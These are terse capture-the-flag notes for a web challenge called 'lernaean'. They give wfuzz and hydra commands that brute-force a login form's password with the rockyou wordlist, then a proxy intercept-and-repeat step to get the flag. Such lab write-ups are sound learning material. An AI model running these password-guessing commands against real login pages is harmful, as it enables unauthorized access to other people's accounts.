# lernaean


#Hit page - invalid password! -> content length 474

#Dirb scan

#wfuzz -hh474 using rockyou.txt -d "password=FUZZ"

or 

#hydra -l admin -P rockyou http-post-form "/:passwrod=^PASS^:Invalid password!" -s 53593

to slow


#intercept on

#send repeater


#grab flag